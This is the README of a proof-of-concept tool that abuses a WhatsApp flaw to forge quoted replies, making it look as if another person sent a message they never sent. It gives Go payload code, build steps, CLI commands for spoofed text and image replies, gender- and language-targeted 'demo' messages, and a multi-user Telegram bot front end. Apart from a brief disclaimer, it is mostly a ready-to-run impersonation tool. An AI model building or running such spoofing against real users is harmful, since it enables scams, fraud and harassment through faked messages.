# Whatsapp Spoofing impersonate of reply message

All official WhatsApp clients, upon receiving a "Message Reply" payload (QuotedMessage), do not validate whether the "ContextInfo" of this "QuotedMessage" is valid/exists ("StanzaId" and "Participant"). This allows a malicious actor to send in private chats or groups a "QuotedMessage" of a message that never existed on behalf of another person. This is highly critical and dangerous.

## App Versions

Latest version on all platforms

## The problem

Users: UserA, UserB; UserA is not known by UserB

UserA (SCAMMER) sends a spoofed messages to UserB in response to a message that UserB did never send

Spoofed message payload:

```go
msg := &waProto.Message{
    ExtendedTextMessage: &waProto.ExtendedTextMessage{
        Text: proto.String("Some text"),
        ContextInfo: &waProto.ContextInfo{
            StanzaId:     proto.String("Some Random ID"), //Random ID
            Participant: proto.String("5511999999999@s.whatsapp.net"), //Spoofed user ID
            QuotedMessage: &waProto.Message{
                Conversation: proto.String("Some Spoofed text"), //QuotedMessage Spoofed text
            },
        },
    },
}
```

Send the Spoofed Payload:

```go
resp, err := cli.SendMessage(context.Background(), chatID, msg) 
// chatID is the ID of the chat you want to send the message to, can be a group or the same number as the spoofed user ID
```

## Installation & Setup

### Clone the repository

```bash
git clone https://github.com/sbeving/whats-poc
cd whats-poc
```

### Install dependencies

```bash
go mod download
go get 
```

### Build

```bash
go build -o whats-spoofing-bot .
```

## Usage

### CLI Mode (Original)

Run the application in CLI mode for direct command-line interaction:

```bash
./whats-spoofing-bot
```

#### CLI Commands

#### Retrieve Group Information

```txt
getgroup <jid>
```

#### List Groups

```txt
listgroups
```

#### Send Spoofed Reply

```txt
send-spoofed-reply <chat_jid> <msgID:!|#ID> <spoofed_jid> <spoofed_text>|<text>
```

#### Send Spoofed Image Reply

```txt
send-spoofed-img-reply <chat_jid> <msgID:!|#ID> <spoofed_jid> <spoofed_file> <spoofed_text>|<text>
```

#### Send Spoofed Demo Message

```txt
send-spoofed-demo <toGender:boy|girl> <language:br|en> <chat_jid> <spoofed_jid>
```

#### Send Spoofed Demo Message with Image

```txt
send-spoofed-demo-img <toGender:boy|girl> <language:br|en> <spoofed_jid> <spoofed_img>
```

### Telegram Bot Mode (New)

Run the application as a Telegram bot for user-friendly interaction:

#### Setup Telegram Bot

1. **Create a Telegram Bot:**
   - Message [@BotFather](https://t.me/BotFather) on Telegram
   - Use `/newbot` command
   - Follow the instructions to create your bot
   - Copy the bot token

2. **Set Environment Variable:**
   ```bash
   export TELEGRAM_BOT_TOKEN="your_bot_token_here"
   ```
   
   Or create a `.env` file based on `.env.example`

3. **Run the Bot:**
   ```bash
   ./whats-spoofing-bot -telegram
   ```

#### Telegram Bot Commands

Once your bot is running, users can interact with it using these commands:

- **`/start`** - Welcome message and bot introduction
- **`/help`** - Show detailed help with all available commands
- **`/login`** - Login to WhatsApp (displays QR code)
- **`/status`** - Check WhatsApp connection status
- **`/listgroups`** - List your WhatsApp groups
- **`/getgroup <jid>`** - Get information about a specific group
- **`/spoofed_reply <chat_jid> <msg_id> <spoofed_jid> <spoofed_text>|<text>`** - Send spoofed reply
- **`/spoofed_img_reply <chat_jid> <msg_id> <spoofed_jid> <file_path> <spoofed_text>|<text>`** - Send spoofed image reply  
- **`/spoofed_demo <gender:boy|girl> <language:br|en> <chat_jid> <spoofed_jid>`** - Send demo spoofed message

#### Parameter Examples

- **chat_jid**: `1234567890@s.whatsapp.net` (individual) or `1234567890-1234567890@g.us` (group)
- **msg_id**: Use `!` for auto-generated ID or provide specific message ID
- **spoofed_jid**: `1234567890@s.whatsapp.net` (user to impersonate)
- **gender**: `boy` or `girl`
- **language**: `br` (Brazilian Portuguese) or `en` (English)

## Features

### Multi-User Support
- **Telegram Bot Mode**: Supports multiple users, each with their own WhatsApp session
- **CLI Mode**: Single-user direct interaction

### Security Features
- Each Telegram user gets their own isolated WhatsApp client session
- Sessions are managed securely with proper authentication
- Bot token authentication for Telegram API

### Session Management
- Automatic QR code generation and handling
- Connection status monitoring
- Graceful session cleanup

## Command Line Flags

- **`-telegram`**: Run in Telegram bot mode instead of CLI mode
- **`-debug`**: Enable debug logging
- **`-db-dialect`**: Database dialect (default: sqlite3)
- **`-db-address`**: Database address (default: file:db/whatsbot.db?_foreign_keys=on)
- **`-request-full-sync`**: Request full history sync when logging in
- **`-media-path`**: Path to store media files (default: media)
- **`-history-path`**: Path to store history files (default: history)

## Legal Disclaimer

⚠️ **IMPORTANT**: This tool is for educational and security research purposes only. 

- Use responsibly and ethically
- Comply with WhatsApp's Terms of Service
- Do not use for harassment, fraud, or malicious activities
- Intended for authorized security testing and research
- Users are responsible for legal compliance in their jurisdiction

## Architecture

### CLI Mode
```
User Input → CLI Handler → WhatsApp Client → WhatsApp Servers
```

### Telegram Bot Mode
```
Telegram User → Telegram Bot API → Bot Handler → User Session → WhatsApp Client → WhatsApp Servers
```

### Database Structure
- SQLite database stores WhatsApp device sessions
- Each Telegram user gets a separate device/session
- Secure session isolation between users

## Contributing

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Test thoroughly
5. Submit a pull request

## Support

For issues and questions:
1. Check existing GitHub issues
2. Create a new issue with detailed information
3. Include logs and error messages
